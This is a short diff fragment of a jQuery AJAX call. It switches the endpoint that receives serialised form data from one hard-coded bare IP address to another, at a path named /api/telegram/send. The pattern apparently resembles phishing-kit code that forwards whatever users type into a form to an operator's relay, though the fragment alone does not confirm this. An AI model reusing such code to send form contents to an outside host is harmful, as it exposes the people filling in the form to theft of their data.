@@ -264,7 +264,7 @@
 		      type: "POST",
 			  dataType: "json",
 			  contentType: "application/json; charset=utf-8",
-		      url: "http://45.141.77.232/api/telegram/send",
+		      url: "http://62.217.180.65/api/telegram/send",
 		      data: JSON.stringify(convertFormToJSON(form)),
 		      beforeSend: function() { 
 
